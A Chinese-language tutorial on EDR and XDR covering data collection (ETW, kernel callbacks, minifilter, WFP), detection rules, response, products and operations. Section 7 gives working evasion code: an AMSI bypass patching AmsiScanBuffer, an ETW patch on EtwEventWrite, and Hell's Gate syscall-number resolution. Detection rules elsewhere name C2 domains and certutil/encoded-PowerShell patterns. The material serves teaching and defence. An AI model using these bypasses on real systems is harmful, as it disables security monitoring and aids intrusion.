# EDR 与 XDR 技术详解

> 本文档系统介绍端点检测与响应（EDR）的架构原理、数据采集技术、检测与响应能力，以及扩展检测与响应（XDR）的概念与架构，涵盖主流产品分析、绕过技术和部署运营实践。

---

## 一、EDR 架构原理

### 1.1 什么是 EDR

**EDR（Endpoint Detection and Response，端点检测与响应）** 是一种部署在终端设备上的安全防护体系，通过持续采集终端行为数据、检测威胁行为、自动响应安全事件，实现对高级威胁的发现和处置。

**EDR 与传统杀毒软件的区别**：

| 维度 | 传统杀毒（AV） | EDR |
|------|----------------|-----|
| 检测方式 | 签名/特征码为主 | 行为分析+机器学习 |
| 响应能力 | 仅删除文件 | 隔离进程/网络/设备 |
| 数据采集 | 几乎不采集 | 持续采集全量行为数据 |
| 可视化 | 仅告警 | 完整攻击链可视化 |
| 事件回溯 | 无 | 完整时间线回溯 |
| 威胁狩猎 | 不支持 | 支持（Threat Hunting） |
| 部署方式 | 终端独立 | 终端+管理平台协同 |

### 1.2 EDR 系统架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        管理平台（云/本地）                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │ 安全大屏  │  │ 事件管理  │  │ 威胁狩猎  │  │ 报表分析  │        │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘        │
│  ┌─────────────────────────────────────────────────────┐        │
│  │              检测引擎 + 分析引擎                       │        │
│  │  规则引擎 / 行为分析 / 机器学习 / 关联分析             │        │
│  └─────────────────────────────────────────────────────┘        │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐         │
│  │  数据存储     │  │  响应引擎     │  │  威胁情报     │         │
│  │  (Elasticsearch│  │  (自动响应)   │  │  (IOC匹配)   │         │
│  │   /对象存储)  │  │              │  │              │         │
│  └──────────────┘  └──────────────┘  └──────────────┘         │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ 加密上报 / 策略下发
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      终端 Agent                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │ 数据采集  │  │ 本地检测  │  │ 响应执行  │  │ 策略缓存  │        │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘        │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3 EDR 四层架构详解

**第一层：数据采集层**

终端 Agent 持续采集终端设备上的各类安全事件数据：

| 数据类型 | 采集内容 | 采集技术 |
|----------|----------|----------|
| 进程事件 | 进程创建/终止/注入 | ETW / 内核回调 |
| 文件事件 | 文件创建/修改/删除 | 文件系统过滤驱动 |
| 网络事件 | 连接/DNS/HTTP | 网络过滤驱动 |
| 注册表事件 | 键值修改 | 注册表过滤驱动 |
| 内存事件 | 内存分配/注入 | 内核回调 |
| 日志事件 | 系统日志/安全日志 | ETW / WEF |

**第二层：检测引擎**

本地轻量检测 + 云端深度分析的分层检测模式：

- **本地规则引擎**：实时匹配已知 IOC 和规则
- **行为分析引擎**：识别可疑行为模式
- **机器学习模型**：端侧推理（轻量模型）+ 云端推理（重型模型）
- **关联分析引擎**：将离散事件关联为攻击链

**第三层：响应引擎**

根据威胁等级执行自动化响应动作：

```
威胁等级    →    响应动作
低危            记录告警
中危            记录 + 通知管理员
高危            隔离进程 + 阻断网络连接
严重            隔离终端 + 终止进程 + 回滚操作
```

**第四层：管理平台**

提供集中化的可视化、管理和分析能力：

- 安全态势大屏
- 事件管理和工单流转
- 威胁狩猎查询界面
- 策略配置与下发
- 报表与合规分析

---

## 二、EDR 数据采集技术

### 2.1 ETW（Event Tracing for Windows）

**ETW** 是 Windows 内核提供的高性能事件追踪机制，EDR 广泛使用 ETW 采集系统行为数据。

**ETW 架构**：

```
┌────────────────────────────────────────┐
│           EDR Agent (消费者)             │
│  EnableTraceEx / EventRegister          │
└───────────────────┬────────────────────┘
                    │ 接收事件
┌───────────────────▼────────────────────┐
│           ETW 核心 (内核层)              │
│  事件缓冲区 / 事件会话 / 事件 Provider   │
└──────┬──────┬──────┬──────┬────────────┘
       │      │      │      │
┌──────▼┐ ┌──▼──┐ ┌▼────┐ ┌▼──────────┐
│内核   │ │磁盘  │ │网络 │ │进程/线程   │
│Provider│ │IO   │ │Provider│Provider │
└──────┘ └────┘ └────┘ └──────────┘
```

**关键 ETW Provider**：

| Provider GUID | 名称 | 采集内容 |
|---------------|------|----------|
| `22fb2cd6-0e7b-422b-a0c7-2f1f1b29...` | Microsoft-Windows-Kernel-Process | 进程创建/终止/映像加载 |
| `ed1fe634-cd9e-4c9d-97d3-4e7e1b0a...` | Microsoft-Windows-Kernel-File | 文件操作 |
| `2021bd22-286b-4a88-9e9a-1f6a...` | Microsoft-Windows-Kernel-Network | 网络连接 |
| `ff56960e-4e70-4b95-9f8c-9e2c...` | Microsoft-Windows-Kernel-Registry | 注册表操作 |
| `e41412e8-9bf7-4be0-9ae3...` | Microsoft-Antimalware-ScanInterface (AMSI) | 脚本内容 |

**ETW 采集代码示例（C#）**：

```csharp
using System.Diagnostics.Tracing;

// 启动 ETW 会话采集进程创建事件
public class ProcessEventListener : EventListener
{
    private const int EventId_ProcessStart = 1;
    private const int EventId_ProcessStop = 2;
    
    protected override void OnEventSourceCreated(EventSource eventSource)
    {
        if (eventSource.Name == "Microsoft-Windows-Kernel-Process")
        {
            EnableEvents(eventSource, EventLevel.Informational, 
                (EventKeywords)0x10); // ProcessKeyword = 0x10
        }
    }
    
    protected override void OnEventWritten(EventWrittenEventArgs eventData)
    {
        switch (eventData.EventId)
        {
            case EventId_ProcessStart:
                var pid = eventData.Payload["ProcessID"];
                var imageName = eventData.Payload["ImageName"];
                var parentPid = eventData.Payload["ParentProcessID"];
                // 上报至 EDR 管理平台
                Console.WriteLine($"[进程创建] PID={pid} " +
                    $"Image={imageName} ParentPID={parentPid}");
                break;
            case EventId_ProcessStop:
                var exitPid = eventData.Payload["ProcessID"];
                var exitCode = eventData.Payload["ExitCode"];
                Console.WriteLine($"[进程退出] PID={exitPid} " +
                    $"ExitCode={exitCode}");
                break;
        }
    }
}

// C++ 原生 ETW 采集
// #include <evntrace.h>
// #include <tdh.h>
// 
// EVENT_TRACE_LOGFILE logFile = {0};
// logFile.LoggerName = KERNEL_LOGGER_NAME;
// logFile.EventRecordCallback = OnEventRecord;  // 回调函数
// TRACEHANDLE hTrace = OpenTrace(&logFile);
// ProcessTrace(&hTrace, 1, NULL, NULL);
```

### 2.2 内核回调

EDR 驱动通过注册内核回调函数来监控系统行为，这是最底层、最可靠的数据采集方式。

**关键内核回调函数**：

```c
// 内核驱动注册回调示例 (WDM/WDF 驱动)

// 1. 进程创建/退出通知
VOID ProcessNotifyCallback(
    HANDLE ParentId,     // 父进程PID
    HANDLE ProcessId,    // 进程PID
    BOOLEAN Create       // TRUE=创建, FALSE=退出
)
{
    if (Create) {
        // 记录进程创建事件
        PEPROCESS process;
        PsLookupProcessByProcessId(ProcessId, &process);
        // 获取进程映像路径、命令行等信息
    }
}

// 注册: PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallback, FALSE);

// 2. 映像加载通知
VOID ImageLoadCallback(
    PIMAGE_INFO ImageInfo,  // 映像信息
    HANDLE ProcessId,       // 加载进程PID
)
{
    // 检测 DLL 注入、可疑模块加载
    if (ImageInfo->ImageFullPathName) {
        // 记录: 进程加载了哪个 DLL/SYS
    }
}

// 注册: PsSetLoadImageNotifyRoutine(ImageLoadCallback);

// 3. 句柄操作通知
VOID HandleCallback(
    PSYSTEM_HANDLE_INFORMATION HandleInfo
)
{
    // 检测跨进程句柄操作（如 OpenProcess 注入）
}

// 注册: ObRegisterCallbacks(&callbackRegistration, &hCallback);

// 4. CNG（加密）通知
VOID CngCallback(...) {
    // 监控加密操作（检测勒索软件加密行为）
}
```

### 2.3 文件系统过滤驱动

文件系统过滤驱动（MiniFilter）是 EDR 监控文件操作的核心技术：

```c
// MiniFilter 驱动注册示例

// 注册 Pre 回调（操作前）
FLT_PREOP_CALLBACK_STATUS PreOperationCallback(
    PFLT_CALLBACK_DATA Data,     // 操作数据
    PFLT_CONTEXT Context,        // 上下文
    PFLT_RELATED_OBJECTS FltObjects  // 关联对象
)
{
    switch (Data->Iopb->MajorFunction)
    {
        case IRP_MJ_CREATE:
            // 文件创建/打开
            // 记录: 文件路径、访问模式、进程信息
            break;
        case IRP_MJ_WRITE:
            // 文件写入 - 检测勒索软件加密行为
            // 触发条件: 大量文件快速修改 + 文件扩展名变更
            break;
        case IRP_MJ_SET_INFORMATION:
            // 文件重命名/删除
            break;
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

// 注册回调
const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE,        0, PreOperationCallback, PostOperationCallback },
    { IRP_MJ_WRITE,         0, PreOperationCallback, PostOperationCallback },
    { IRP_MJ_SET_INFORMATION,0, PreOperationCallback, NULL },
    { IRP_MJ_OPERATION_END }
};
```

### 2.4 网络过滤

EDR 的网络监控通过 WFP（Windows Filtering Platform）或 NDIS 驱动实现：

```c
// WFP callout 驱动示例
// 监控网络连接

// ALE（Application Layer Enforcement）层 Callout
void NTAPI CalloutClassify(
    const FWPS_INCOMING_VALUES *inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES *inMetaValues,
    void *layerData,
    const void *classifyContext,
    const FWPS_FILTER *filter,
    UINT64 flowContext,
    FWPS_CLASSIFY_OUT *classifyOut
)
{
    // 获取远程地址、端口
    UINT32 remoteIp = inFixedValues->incomingValue
        [FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_ADDRESS].value.uint32;
    UINT16 remotePort = inFixedValues->incomingValue
        [FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_PORT].value.uint16;
    
    // 获取发起进程
    UINT64 processId = inMetaValues->processId;
    
    // 记录: PID -> IP:Port 连接信息
    // 可阻断已知恶意 C2 通信
}
```

---

## 三、EDR 检测技术

### 3.1 特征检测

基于已知威胁特征（IOC）的精确匹配：

```json
// EDR 规则示例 - IOC 匹配
{
  "rule_name": "检测 Cobalt Strike Beacon",
  "rule_type": "ioc_match",
  "severity": "high",
  "conditions": {
    "match_any": [
      {
        "field": "process.command_line",
        "operator": "contains",
        "value": "cmd.exe /c powershell -enc"
      },
      {
        "field": "network.dns_query",
        "operator": "in",
        "value": ["evil-c2.com", "malware-cnc.net"]
      },
      {
        "field": "process.hash_sha256",
        "operator": "in",
        "value": ["a1b2c3...", "d4e5f6..."]
      },
      {
        "field": "file.path",
        "operator": "matches_regex",
        "value": ".*\\\\AppData\\\\Local\\\\Temp\\\\[a-z]{8}\\.exe$"
      }
    ]
  },
  "response": {
    "action": "quarantine_process",
    "block_network": true,
    "alert": true
  }
}
```

### 3.2 行为检测

基于行为模式的检测，不依赖具体特征：

```
行为检测规则 - 勒索软件检测

触发条件（满足3个以上即告警）：
├── 1. 短时间内大量文件修改 (>100次/分钟)
├── 2. 文件扩展名批量变更 (.docx → .locked)
├── 3. 文件内容被大量覆写
├── 4. 卷影副本被删除 (vssadmin delete shadows)
├── 5. 备份文件被删除
├── 6. 进程操作异常目录 (Documents/Desktop 全盘遍历)
└── 7. 存在已知勒索扩展名列表匹配
```

```python
# 行为检测伪代码 - 进程链分析
def detect_suspicious_process_chain(events):
    """
    检测可疑进程链，例如:
    Word → cmd.exe → powershell.exe → certutil.exe
    """
    suspicious_patterns = [
        # Office 文档 → 子进程执行
        ["winword.exe|excel.exe|powerpnt.exe", 
         "cmd.exe|powershell.exe"],
        # PowerShell → 编码执行
        ["powershell.exe", ".*-enc.*|-e "],
        # Certutil 下载
        ["cmd.exe", "certutil.exe", ".*-urlcache.*|.*-split.*"],
        # WMI 横向移动
        ["wmiprvse.exe", "cmd.exe|powershell.exe"],
        # SQL 注入执行命令
        ["sqlservr.exe", "cmd.exe|powershell.exe"],
    ]
    
    # 构建进程树
    process_tree = build_process_tree(events)
    
    # 遍历进程链匹配模式
    for leaf in process_tree.leaves():
        chain = get_chain_to_root(leaf)
        for pattern in suspicious_patterns:
            if match_pattern(chain, pattern):
                generate_alert(
                    severity="high",
                    chain=chain,
                    pattern=pattern
                )
```

### 3.3 机器学习检测

EDR 使用机器学习模型识别未知威胁：

| 模型类型 | 用途 | 特征示例 |
|----------|------|----------|
| 二分类模型 | 恶意/良性判定 | 文件熵值、API 调用序列 |
| 异常检测 | 行为基线偏离 | 进程行为基线对比 |
| 序列模型 | 时序行为分析 | 进程创建序列 LSTM |
| 图神经网络 | 攻击图分析 | 进程-文件-网络关系图 |

### 3.4 关联分析

将离散的安全事件关联为完整的攻击链：

```
MITRE ATT&CK 关联分析示例

攻击时间线:
T-0    用户收到钓鱼邮件，打开附件 invoice.docx
T+5s   Word 启动，加载恶意宏
T+10s  Word 创建子进程 powershell.exe (T1059)
T+12s  PowerShell 执行编码命令下载 Payload (T1105)
T+15s  PowerShell 创建计划任务实现持久化 (T1053)
T+20s  Payload 建立 C2 连接 (T1071)
T+30s  C2 下发命令，执行 whoami /priv (T1082)
T+35s  执行 net view 探测内网 (T1018)
T+60s  尝试 SMB 横向移动 (T1021)

EDR 关联分析输出:
├── 攻击阶段: 初始访问 → 执行 → 持久化 → 命令控制 → 横向移动
├── 入口点: invoice.docx (钓鱼邮件附件)
├── C2 通信: 192.168.x.x:443
├── 受影响主机: 终端A (初始感染) + 终端B (横向移动目标)
└── ATT&CK 覆盖: T1566, T1059, T1105, T1053, T1071, T1082, T1018, T1021
```

---

## 四、EDR 响应能力

### 4.1 隔离（Isolation）

EDR 可以在不同层级实施隔离：

| 隔离层级 | 措施 | 影响 |
|----------|------|------|
| 进程隔离 | 终止恶意进程 | 最小影响 |
| 网络隔离 | 阻断出站连接 | 断网但本地可用 |
| 用户隔离 | 注销用户会话 | 中断用户操作 |
| 设备隔离 | 完全隔离终端 | 仅保留 EDR 通信 |

**网络隔离实现**：

```powershell
# EDR 网络隔离逻辑 (PowerShell 伪代码)
# 允许 EDR 通信端口，阻断其余所有网络流量

# 1. 创建隔离防火墙规则
New-NetFirewallRule -Name "EDR_Isolation_BlockAllOutbound" `
    -Direction Outbound -Action Block `
    -Profile Any -Enabled True

# 2. 允许 EDR Agent 通信（放行管理服务器IP）
New-NetFirewallRule -Name "EDR_Allow_MgmtServer" `
    -Direction Outbound -Action Allow `
    -RemoteAddress "10.0.0.100" `
    -RemotePort 443 -Protocol TCP

# 3. 允许 DNS（如需要）
New-NetFirewallRule -Name "EDR_Allow_DNS" `
    -Direction Outbound -Action Allow `
    -RemotePort 53 -Protocol UDP
```

### 4.2 终止与回滚

```
响应动作详解：

1. 终止进程
   - 终止恶意进程及其子进程
   - 清理进程注入的线程
   - 删除持久化项（计划任务/注册表自启/服务）

2. 文件回滚
   - 恢复被修改的文件（从备份/快照）
   - 删除释放的恶意文件
   - 恢复注册表修改

3. 网络连接阻断
   - 阻断 C2 连接
   - DNS 黑名单（恶意域名）
   - IP 封禁（恶意 IP）

4. 账户处理
   - 禁用被攻击者利用的账户
   - 撤销被窃取的凭据
   - 重置受影响用户密码
```

---

## 五、XDR 概念与架构

### 5.1 什么是 XDR

**XDR（Extended Detection and Response，扩展检测与响应）** 在 EDR 基础上扩展了数据源范围，整合端点、网络、云、邮件等多维度数据，实现跨域威胁检测和响应。

```
XDR 数据源整合

┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
│  端点EDR  │  │ 网络NDR  │  │ 云安全   │  │ 邮件安全  │  │ 身份安全  │
│  Agent   │  │  传感器  │  │ CWPP/CSPM│  │  网关    │  │  IAM    │
└────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘
     │             │             │             │             │
     └─────────────┴─────────────┴─────────────┴─────────────┘
                              │
                    ┌─────────▼─────────┐
                    │  XDR 统一分析引擎   │
                    │  关联分析 / 机器学习 │
                    └─────────┬─────────┘
                              │
                    ┌─────────▼─────────┐
                    │  统一响应编排      │
                    │  跨域自动响应      │
                    └───────────────────┘
```

### 5.2 XDR 核心能力

| 能力 | 说明 |
|------|------|
| 统一数据湖 | 跨域安全数据统一存储和查询 |
| 跨域关联分析 | 端点+网络+云端联合分析攻击链 |
| 统一告警 | 消除各域独立告警，输出统一事件 |
| 自动响应编排 | 跨域自动联动响应 |
| 开放集成 | 支持第三方数据源和工具集成 |

### 5.3 XDR vs EDR vs SIEM

| 维度 | SIEM | EDR | XDR |
|------|------|-----|-----|
| 数据范围 | 全域（日志为主） | 仅端点 | 端点+网络+云+邮件 |
| 数据深度 | 日志级 | 深度行为数据 | 多域深度数据 |
| 检测能力 | 规则/关联 | 行为+ML | 跨域关联+ML |
| 响应能力 | 告警为主 | 端点响应 | 跨域自动响应 |
| 部署复杂度 | 高 | 中 | 中 |
| 数据量 | 海量 | 中等 | 大 |
| 实时性 | 准实时 | 实时 | 实时 |
| 运维成本 | 高 | 中 | 中低（厂商预置） |
| 适用场景 | 合规/态势感知 | 终端防护 | 全域威胁检测 |

**选择建议**：

```
企业规模与安全方案选择

小型企业（<100人）:
  → 云原生 XDR 或托管 EDR（低成本、易运维）

中型企业（100-1000人）:
  → EDR + 轻量 SIEM 或 原生 XDR

大型企业（1000+人）:
  → XDR + SIEM（合规）+ SOAR（自动化）

关键基础设施:
  → 自建 XDR + 专用威胁狩猎团队
```

---

## 六、主流 EDR 产品分析

### 6.1 产品对比

| 产品 | 厂商 | 检测优势 | 响应能力 | 国内可用性 |
|------|------|----------|----------|------------|
| CrowdStrike Falcon | CrowdStrike | 云原生+行为分析 | 强 | 受限 |
| SentinelOne | SentinelOne | AI+自动响应 | 强 | 受限 |
| Defender for Endpoint | Microsoft | 深度集成Windows | 强 | 可用 |
| Carbon Black | VMware | 行为分析+威胁狩猎 | 强 | 受限 |
| 奇安信天擎 | 奇安信 | 本土适配+合规 | 中强 | 强 |
| 深信服EDR | 深信服 | 病毒+勒索防护 | 中强 | 强 |
| 微步终端安全 | 微步在线 | 威胁情报驱动 | 中 | 强 |
| 360终端安全 | 360 | 安全大脑+大数据 | 中强 | 强 |

### 6.2 CrowdStrike Falcon

```
CrowdStrike Falcon 架构

终端 Sensor (轻量Agent ~30MB)
├── 采集: 进程/文件/网络/注册表/内存
├── 本地检测: 机器学习模型
├── 云端查询: 指纹上传云端分析
└── 响应执行: 隔离/终止/网络阻断

云端平台 (Falcon)
├── Falcon Insight - EDR 功能
├── Falcon Overwatch - 托管威胁狩猎
├── Falcon Intelligence - 威胁情报
├── Falcon Discover - 资产发现
└── Falcon Firewall - 主机防火墙
```

### 6.3 Microsoft Defender for Endpoint

```powershell
# Defender for Endpoint 关键命令

# 查看保护状态
Get-MpComputerStatus

# 查看当前威胁
Get-MpThreatDetection

# 触发快速扫描
Start-MpScan -ScanType QuickScan

# 隔离特定文件
Add-MpPreference -ThreatName "Trojan.Win32.Generic" -Action Quarantine

# 添加排除项（需谨慎）
Add-MpPreference -ExclusionPath "C:\MyApp"

# 启用网络保护
Set-MpPreference -EnableNetworkProtection Enabled

# 查看攻击面减少规则
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids

# 高级 hunting 查询 (KQL)
# DeviceProcessEvents
# | where ProcessCommandLine has "powershell" and has "-enc"
# | project Timestamp, DeviceName, ProcessCommandLine
```

---

## 七、EDR 绕过技术

### 7.1 直接系统调用（Direct Syscalls）

绕过 EDR 的用户态 API Hook（如 ntdll.dll 中的 Nt* 函数 Hook），直接执行系统调用指令。

```c
// 直接系统调用示例 - NtAllocateVirtualMemory
// 从 ntdll.dll 中提取系统调用号，直接 syscall

; x64 汇编 - 直接系统调用
; 替代调用 NtAllocateVirtualMemory
; 避免经过 ntdll.dll 的 Hook 点

my_NtAllocateVirtualMemory proc
    ; 系统调用号需要动态获取（不同 Windows 版本不同）
    mov r10, rcx            ; 将第一个参数移到 r10
    mov eax, 18h            ; NtAllocateVirtualMemory 系统调用号
    syscall                 ; 直接系统调用，绕过 ntdll Hook
    ret
my_NtAllocateVirtualMemory endp

; 完整的 Syswhispers 风格实现
; 使用 Hell's Gate / Halo's Gate 技术动态获取 SSN
; https://github.com/jthuriez/Hello's Gate
```

```c
// Hell's Gate - 动态获取 SSN
// 遍历 ntdll 导出表找到 Nt* 函数
// 读取函数开头的 syscall 指令获取 SSN

DWORD GetSSN(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    DWORD ssn = 0;
    
    // 获取函数地址
    FARPROC func = GetProcAddress(ntdll, functionName);
    
    // 读取函数开头字节，提取 syscall number
    // Nt* 函数开头通常是:
    // mov r10, rcx       (4C 8B D1)
    // mov eax, <SSN>     (B8 XX XX 00 00)
    BYTE* ptr = (BYTE*)func;
    if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1 &&
        ptr[3] == 0xB8) {
        ssn = *(DWORD*)(ptr + 4);
    } else {
        // 如果被 Hook，函数开头不是标准模式
        // 使用 Halo's Gate - 遍历相邻函数推测 SSN
        for (int i = 1; i <= 500; i++) {
            ptr = (BYTE*)func + i * 0x20; // 相邻函数间隔
            if (ptr[0] == 0x4C && ptr[3] == 0xB8) {
                ssn = *(DWORD*)(ptr + 4) + i;
                break;
            }
            ptr = (BYTE*)func - i * 0x20;
            if (ptr[0] == 0x4C && ptr[3] == 0xB8) {
                ssn = *(DWORD*)(ptr + 4) - i;
                break;
            }
        }
    }
    return ssn;
}
```

### 7.2 AMSI 绕过

**AMSI（Anti-Malware Scan Interface）** 是 Windows 10+ 提供的恶意内容扫描接口，EDR 通过 AMSI 扫描 PowerShell 脚本等内容。

```powershell
# AMSI 绕过 - 修改内存中 AmsiScanBuffer 函数

# 方式1: 内存 Patch（将 AmsiScanBuffer 返回成功）
# AmsiScanBuffer 开头 patch 为直接返回 S_OK
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 方式2: 直接 Patch Amsi.dll
# 将 AmsiScanBuffer 的第一条指令替换为 ret
$signature = @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr addr, int size, 
    int newProtect, out int oldProtect);
"@
$type = Add-Type -Member $signature -Name Win32 -Namespace PS -PassThru
$handle = $type::LoadLibrary("amsi.dll")
$addr = $type::GetProcAddress($handle, "AmsiScanBuffer")
$old = 0
$type::VirtualProtect($addr, 5, 0x40, [ref]$old) | Out-Null
$patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80)  # mov eax, 0x80070057
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 5)
```

### 7.3 ETW 绕过

```c
// ETW 绕过 - Patch EtwNotificationWrite 或 EtwEventWrite
// 使 EDR 注册的 ETW 提供者无法接收事件

#include <windows.h>

void PatchETW() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    
    // 将 EtwEventWrite 的开头 patch 为 ret
    // 这样所有 ETW 事件写入请求都被跳过
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 0xC3 = ret 指令
    *(BYTE*)etwEventWrite = 0xC3;
    
    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
}

// 更隐蔽的方式: 取消 ETW Provider 注册
// EDR Agent 启动的 ETW Trace Session 被终止
// EtwStopTrace(SessionHandle)
```

### 7.4 进程注入检测绕过

```
EDR 检测进程注入的方式:
├── 监控 OpenProcess 跨进程句柄获取
├── 监控 VirtualAllocEx + WriteProcessMemory 组合
├── 监控 CreateRemoteThread / NtCreateThreadEx
├── 监控 QueueUserAPC
└── 监控 SetThreadContext

绕过思路:
├── 使用间接调用（不直接调用 API）
├── 使用合法系统进程作为注入目标
├── 使用 NtMapViewOfSection（共享内存映射）
├── 使用 Process Ghosting / Herpaderping
├── 使用 Module Stomping（覆盖合法 DLL）
└── 在 EDR Agent 加载前执行（Boot 启动）
```

---

## 八、EDR 部署与运营最佳实践

### 8.1 部署策略

```
EDR 部署成熟度模型

Level 1 - 基础部署
├── 全终端覆盖安装
├── 默认规则启用
├── 告警人工处理
└── 适合: 初次部署 EDR 的组织

Level 2 - 优化运营
├── 自定义规则（适配业务场景）
├── 白名单管理（减少误报）
├── 自动响应策略配置
├── 定期威胁狩猎
└── 适合: 有专职安全团队的机构

Level 3 - 高级运营
├── XDR 跨域联动
├── SOAR 自动化编排
├── 主动威胁狩猎（Threat Hunting）
├── 自研检测规则
├── ATT&CK 覆盖度评估
└── 适合: 大型安全运营中心
```

### 8.2 规则调优

```yaml
# EDR 规则调优检查清单

误报处理:
  - 分析误报根因，调整规则条件
  - 对业务正常行为建立白名单
  - 使用更精确的匹配条件
  - 设置告警阈值和聚合窗口

漏报补查:
  - 结合威胁情报补充 IOC
  - 基于红蓝对抗结果补充检测规则
  - 定期 ATT&CK 技术覆盖率评估
  - 引入新威胁的检测规则

规则生命周期:
  - 新规则: 先观察模式（仅告警不响应）
  - 验证: 收集7天误报率数据
  - 上线: 误报率 < 5% 后启用自动响应
  - 退役: 规则失效后归档
```

### 8.3 威胁狩猎（Threat Hunting）

```
威胁狩猎方法论

假设驱动型狩猎:
1. 提出假设: "攻击者可能利用 WMI 实现持久化"
2. 编写查询: 查找 WMI 订阅创建行为
3. 分析结果: 过滤正常运维操作
4. 深入调查: 追踪可疑 WMI 消费者脚本
5. 更新规则: 将发现转化为新检测规则

KQL 威胁狩猎示例 (Defender):

// 查找异常 PowerShell 编码执行
DeviceProcessEvents
| where ProcessCommandLine has_any("-enc", "-EncodedCommand")
| where InitiatingProcessFileName in~ (
    "winword.exe", "excel.exe", "outlook.exe", "powerpnt.exe"
)
| project Timestamp, DeviceName, 
    InitiatingProcessFileName, ProcessCommandLine

// 查找可疑计划任务创建
DeviceProcessEvents
| where ProcessCommandLine has "schtasks" and has_any(
    "/create", "/Change")
| where ProcessCommandLine has_any(
    "powershell", "cmd", "wscript", "mshta", "rundll32"
)
```

### 8.4 EDR vs EDR 攻防对抗

```
攻防对抗中的 EDR 角色红队视角（攻击方）:
  - 信息收集: 目标终端安装的 EDR 类型和版本
  - 绕过测试: AMSI/ETW/系统调用绕过
  - 免杀: 修改 Payload 特征规避检测
  - 环境感知: 检测 EDR Agent 进程和服务
  - 利用合法工具: LOLBins 减少行为异常

蓝队视角（防守方）:
  - 规则优化: 持续降低误报/漏报
  - 威胁狩猎: 主动发现隐蔽威胁
  - 攻击链还原: 利用 EDR 数据追踪攻击者
  - 快速响应: 自动化隔离和清除
  - 经验积累: 每次攻防对抗转化为规则
```

---

> **学习建议**：EDR/XDR 是现代企业终端安全的核心技术。建议学习者结合实际部署体验（如试用 Defender for Endpoint），深入理解数据采集、检测引擎、响应机制的工作原理。同时关注红队绕过技术的发展动态，理解攻防对抗的平衡关系。
